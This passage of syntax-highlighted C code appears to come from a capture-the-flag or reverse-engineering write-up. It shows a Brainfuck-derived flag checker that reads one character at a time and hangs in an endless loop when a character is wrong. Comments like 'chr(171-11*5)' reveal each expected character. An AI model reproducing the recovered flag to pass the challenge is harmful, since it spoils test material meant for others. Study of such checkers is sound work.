    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">82</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(171-11*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">171</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(114-9*7)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">114</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(128-11*3)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">128</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(102-17*3)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">17</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">102</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(170-11*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">170</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(104-8*7)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">104</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(138-6*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">138</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(108-8*7)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">108</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(173-9*7)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">173</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(133-6*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">133</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(98-9*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
